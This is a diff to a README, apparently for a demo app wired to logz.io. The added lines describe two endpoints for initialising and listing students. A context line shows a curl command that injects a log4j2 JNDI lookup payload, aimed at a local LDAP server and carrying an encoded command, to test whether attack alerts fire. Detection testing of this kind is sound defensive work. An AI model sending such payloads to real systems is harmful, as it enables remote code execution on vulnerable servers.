@@ -8,3 +8,9 @@ In order to test the log4j2 vulnerability:
 3. run: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1388/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
    This simulate a jndi attack and should trigger alert in our system.
 
+
+Additional options:
+
+1. Use the browser (or curl) and go to localhost:8080/students/init to initialize a list of student (logs will be sent to the logzio app)
+
+2. Use the browser (or curl) and go to localhost:8080/students/all to get all the students full names (logs will be sent to the logzio app)
